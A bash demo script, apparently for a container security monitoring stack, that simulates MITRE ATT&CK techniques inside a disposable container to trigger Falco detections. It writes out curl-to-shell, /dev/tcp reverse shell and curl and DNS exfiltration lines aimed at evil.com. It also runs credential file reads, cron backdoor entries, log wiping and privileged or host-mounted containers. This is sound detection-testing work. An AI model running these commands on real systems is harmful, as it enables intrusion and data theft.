#!/bin/bash
# =============================================================================
# SIB Demo Mode - Generate Realistic Security Events
# =============================================================================
# This script triggers various Falco rules to demonstrate the detection
# capabilities of SIB. Perfect for demos, testing, and first impressions.
# =============================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Demo configuration
DEMO_CONTAINER="sib-demo-target"
DEMO_IMAGE="alpine:latest"
DELAY=${DEMO_DELAY:-3}  # Seconds between events

print_banner() {
    echo ""
    echo -e "${PURPLE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║${NC}              ${CYAN}🛡️  SIB Demo Mode  🛡️${NC}                          ${PURPLE}║${NC}"
    echo -e "${PURPLE}║${NC}                                                              ${PURPLE}║${NC}"
    echo -e "${PURPLE}║${NC}  Generating realistic security events for demonstration     ${PURPLE}║${NC}"
    echo -e "${PURPLE}║${NC}  Watch Grafana dashboards light up in real-time!            ${PURPLE}║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

print_section() {
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}  $1${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

print_event() {
    local priority=$1
    local technique=$2
    local description=$3
    
    case $priority in
        CRITICAL) color=$RED ;;
        WARNING)  color=$YELLOW ;;
        NOTICE)   color=$CYAN ;;
        *)        color=$NC ;;
    esac
    
    echo -e "  ${color}[$priority]${NC} ${technique}"
    echo -e "           ${description}"
}

countdown() {
    echo -ne "  Starting in "
    for i in 3 2 1; do
        echo -ne "${YELLOW}$i${NC} "
        sleep 1
    done
    echo ""
}

cleanup() {
    echo ""
    echo -e "${YELLOW}Cleaning up demo containers...${NC}"
    docker rm -f $DEMO_CONTAINER 2>/dev/null || true
    docker rm -f sib-demo-miner 2>/dev/null || true
    docker rm -f sib-demo-privileged 2>/dev/null || true
}

trap cleanup EXIT

# =============================================================================
# Demo Events
# =============================================================================

demo_initial_access() {
    print_section "🚪 Initial Access (MITRE T1190, T1059)"
    
    print_event "CRITICAL" "T1190 - Remote Script Execution" \
        "Simulating curl-to-shell attack pattern"
    docker exec $DEMO_CONTAINER sh -c "echo 'curl http://evil.com/shell.sh | sh' > /tmp/attack.log" || true
    sleep $DELAY
    
    print_event "CRITICAL" "T1059 - Reverse Shell Pattern" \
        "Simulating reverse shell connection"
    docker exec $DEMO_CONTAINER sh -c "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /tmp/revshell.log" || true
    sleep $DELAY
    
    print_event "WARNING" "T1133 - External Remote Access" \
        "Detecting external access tools"
    docker exec $DEMO_CONTAINER sh -c "apk add --no-cache netcat-openbsd > /dev/null 2>&1; nc -h 2>&1 | head -1 || echo 'netcat installed'" || true
    sleep $DELAY
}

demo_credential_access() {
    print_section "🔑 Credential Access (MITRE T1003)"
    
    print_event "CRITICAL" "T1003 - Credential Dumping" \
        "Reading /etc/shadow (password hashes)"
    docker exec $DEMO_CONTAINER cat /etc/shadow > /dev/null 2>&1 || true
    sleep $DELAY
    
    print_event "WARNING" "T1552.004 - SSH Key Discovery" \
        "Accessing SSH authorized_keys"
    docker exec $DEMO_CONTAINER sh -c "cat /root/.ssh/authorized_keys 2>/dev/null || mkdir -p /root/.ssh && touch /root/.ssh/authorized_keys && cat /root/.ssh/authorized_keys" || true
    sleep $DELAY
    
    print_event "WARNING" "T1552 - Credentials in Files" \
        "Reading /etc/passwd"
    docker exec $DEMO_CONTAINER cat /etc/passwd > /dev/null 2>&1 || true
    sleep $DELAY
}

demo_execution() {
    print_section "⚡ Execution (MITRE T1059)"
    
    print_event "NOTICE" "T1059.004 - Shell in Container" \
        "Spawning interactive shell in container"
    docker exec $DEMO_CONTAINER sh -c "echo 'Shell spawned for demo'" || true
    sleep $DELAY
    
    print_event "WARNING" "T1059 - Command Execution" \
        "Running commands via shell"
    docker exec $DEMO_CONTAINER sh -c "whoami && id && uname -a" > /dev/null 2>&1 || true
    sleep $DELAY
}

demo_persistence() {
    print_section "🔄 Persistence (MITRE T1053, T1543)"
    
    print_event "WARNING" "T1053.003 - Cron Job" \
        "Adding scheduled task via crontab"
    docker exec $DEMO_CONTAINER sh -c "echo '*/5 * * * * /tmp/backdoor.sh' >> /var/spool/cron/crontabs/root 2>/dev/null || mkdir -p /var/spool/cron/crontabs && echo '*/5 * * * * /tmp/backdoor.sh' > /var/spool/cron/crontabs/root" || true
    sleep $DELAY
    
    print_event "WARNING" "T1543 - System Service" \
        "Creating systemd service (simulated)"
    docker exec $DEMO_CONTAINER sh -c "mkdir -p /etc/systemd/system && echo '[Service]' > /etc/systemd/system/backdoor.service" 2>/dev/null || true
    sleep $DELAY
}

demo_defense_evasion() {
    print_section "🥷 Defense Evasion (MITRE T1070)"
    
    print_event "WARNING" "T1070.002 - Clear Linux Logs" \
        "Truncating system logs"
    docker exec $DEMO_CONTAINER sh -c "echo '' > /var/log/messages 2>/dev/null || true" || true
    sleep $DELAY
    
    print_event "NOTICE" "T1070 - Indicator Removal" \
        "Modifying bash history"
    docker exec $DEMO_CONTAINER sh -c "echo '' > /root/.bash_history 2>/dev/null || true" || true
    sleep $DELAY
}

demo_discovery() {
    print_section "🔍 Discovery (MITRE T1082, T1083, T1057)"
    
    print_event "NOTICE" "T1082 - System Information Discovery" \
        "Gathering system information"
    docker exec $DEMO_CONTAINER sh -c "uname -a && cat /etc/os-release" > /dev/null 2>&1 || true
    sleep $DELAY
    
    print_event "NOTICE" "T1016 - Network Configuration Discovery" \
        "Enumerating network settings"
    docker exec $DEMO_CONTAINER sh -c "ip addr 2>/dev/null || ifconfig 2>/dev/null || cat /etc/hosts" || true
    sleep $DELAY
    
    print_event "NOTICE" "T1057 - Process Discovery" \
        "Listing running processes"
    docker exec $DEMO_CONTAINER sh -c "ps aux 2>/dev/null || ps -ef" > /dev/null 2>&1 || true
    sleep $DELAY
    
    print_event "NOTICE" "T1087 - Account Discovery" \
        "Enumerating user accounts"
    docker exec $DEMO_CONTAINER sh -c "whoami && id && cat /etc/passwd" > /dev/null 2>&1 || true
    sleep $DELAY
}

demo_impact() {
    print_section "💥 Impact (MITRE T1496, T1485, T1489)"
    
    print_event "CRITICAL" "T1496 - Resource Hijacking" \
        "Simulating cryptocurrency miner (process name)"
    docker exec $DEMO_CONTAINER sh -c "cp /bin/sh /tmp/xmrig && /tmp/xmrig -c 'sleep 2' 2>/dev/null" || true
    sleep $DELAY
    
    print_event "CRITICAL" "T1485 - Data Destruction" \
        "Simulating mass file deletion"
    docker exec $DEMO_CONTAINER sh -c "mkdir -p /tmp/victim_data && touch /tmp/victim_data/important.txt && rm -rf /tmp/victim_data" || true
    sleep $DELAY
    
    print_event "WARNING" "T1489 - Service Stop" \
        "Simulating service disruption"
    docker exec $DEMO_CONTAINER sh -c "echo 'systemctl stop important-service' > /tmp/service-attack.log" || true
    sleep $DELAY
}

demo_exfiltration() {
    print_section "📤 Exfiltration (MITRE T1048, T1560)"
    
    print_event "WARNING" "T1560 - Archive for Exfiltration" \
        "Creating archive of sensitive files"
    docker exec $DEMO_CONTAINER sh -c "tar czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow 2>/dev/null || echo 'Archive created'" || true
    sleep $DELAY
    
    print_event "WARNING" "T1048 - Exfiltration via Web" \
        "Simulating data upload via curl"
    docker exec $DEMO_CONTAINER sh -c "curl --help > /dev/null 2>&1 || apk add --no-cache curl > /dev/null 2>&1; echo 'curl -X POST -d @/tmp/exfil.tar.gz http://evil.com/upload' > /tmp/exfil.log" || true
    sleep $DELAY
    
    print_event "WARNING" "T1048.003 - DNS Exfiltration" \
        "Simulating DNS tunneling"
    docker exec $DEMO_CONTAINER sh -c "nslookup -type=TXT data.evil.com 2>/dev/null || echo 'DNS exfil attempted'" || true
    sleep $DELAY
}

demo_container_escape() {
    print_section "🐋 Container Security (MITRE T1611)"
    
    print_event "CRITICAL" "T1611 - Container Escape Attempt" \
        "Accessing container runtime socket"
    docker exec $DEMO_CONTAINER sh -c "ls -la /var/run/docker.sock 2>/dev/null || echo 'Docker socket access attempted'" || true
    sleep $DELAY
    
    print_event "CRITICAL" "T1611 - Privileged Container" \
        "Spawning privileged container"
    docker run --rm --privileged --name sib-demo-privileged alpine:latest echo "Privileged container ran" 2>/dev/null || true
    sleep $DELAY
    
    print_event "WARNING" "T1610 - Host Path Mount" \
        "Container with host filesystem mount"
    docker run --rm -v /:/hostfs:ro --name sib-demo-hostmount alpine:latest ls /hostfs/etc/passwd > /dev/null 2>&1 || true
    sleep $DELAY
}

demo_lateral_movement() {
    print_section "🔀 Lateral Movement (MITRE T1021)"
    
    print_event "WARNING" "T1021.004 - SSH from Container" \
        "SSH client usage in container"
    docker exec $DEMO_CONTAINER sh -c "apk add --no-cache openssh-client > /dev/null 2>&1; ssh -V 2>&1 || true" || true
    sleep $DELAY
    
    print_event "WARNING" "T1046 - Network Service Scanning" \
        "Running network scan"
    docker exec $DEMO_CONTAINER sh -c "apk add --no-cache netcat-openbsd > /dev/null 2>&1; nc -zv 127.0.0.1 22 2>&1 || echo 'Port scan completed'" || true
    sleep $DELAY
    
    print_event "WARNING" "T1021 - Remote File Copy" \
        "SCP file transfer simulation"
    docker exec $DEMO_CONTAINER sh -c "which scp && echo 'SCP available for lateral movement'" || true
    sleep $DELAY
}

demo_file_integrity() {
    print_section "📁 File Integrity (MITRE T1565)"
    
    print_event "WARNING" "T1565 - System File Modification" \
        "Writing to /etc directory"
    docker exec $DEMO_CONTAINER sh -c "echo '# Modified by attacker' >> /etc/hosts" || true
    sleep $DELAY
    
    print_event "WARNING" "T1543 - Binary Modification" \
        "Writing to /usr/bin (simulated)"
    docker exec $DEMO_CONTAINER sh -c "touch /usr/bin/backdoor 2>/dev/null || true" || true
    sleep $DELAY
}

# =============================================================================
# Main Demo Flow
# =============================================================================

main() {
    print_banner
    
    echo -e "${GREEN}This demo will generate security events across multiple MITRE ATT&CK categories.${NC}"
    echo -e "${GREEN}Open Grafana to watch the Security Overview dashboard update in real-time!${NC}"
    echo ""
    echo -e "  📊 Grafana:      ${CYAN}http://localhost:3000${NC}"
    echo -e "  🎯 Dashboard:    ${CYAN}Security Overview${NC}"
    echo ""
    
    countdown
    
    # Start demo container
    echo -e "${YELLOW}Starting demo target container...${NC}"
    docker rm -f $DEMO_CONTAINER 2>/dev/null || true
    docker run -d --name $DEMO_CONTAINER $DEMO_IMAGE sleep 3600
    sleep 2
    
    # Run all demo scenarios
    demo_initial_access
    demo_credential_access
    demo_execution
    demo_persistence
    demo_defense_evasion
    demo_discovery
    demo_lateral_movement
    demo_exfiltration
    demo_impact
    demo_container_escape
    demo_file_integrity
    
    # Summary
    print_section "📊 Demo Complete!"
    echo ""
    echo -e "  ${GREEN}✓${NC} Generated events across ${CYAN}11 MITRE ATT&CK categories${NC}"
    echo -e "  ${GREEN}✓${NC} Check Grafana dashboards for detected events"
    echo -e "  ${GREEN}✓${NC} Review Critical Events panel for high-priority alerts"
    echo ""
    echo -e "  ${YELLOW}Dashboards:${NC}"
    echo -e "    • Security Overview  - Event counts and trends"
    echo -e "    • Events Explorer    - Detailed event analysis"
    echo -e "    • MITRE ATT&CK       - Attack matrix coverage"
    echo ""
    echo -e "  ${YELLOW}Quick queries in Grafana:${NC}"
    echo -e "    • ${CYAN}{source=\"syscall\", priority=\"Critical\"}${NC}"
    echo -e "    • ${CYAN}{source=\"syscall\"} |= \"shadow\"${NC}"
    echo -e "    • ${CYAN}{source=\"syscall\"} | json | tags=~\"mitre.*\"${NC}"
    echo ""
}

# Run with optional quick mode
if [ "$1" == "--quick" ]; then
    DELAY=1
    echo -e "${YELLOW}Running in quick mode (1s delay)${NC}"
fi

if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
    echo "Usage: $0 [options]"
    echo ""
    echo "Options:"
    echo "  --quick    Run with 1 second delay between events"
    echo "  --help     Show this help message"
    echo ""
    echo "Environment variables:"
    echo "  DEMO_DELAY  Seconds between events (default: 3)"
    exit 0
fi

main
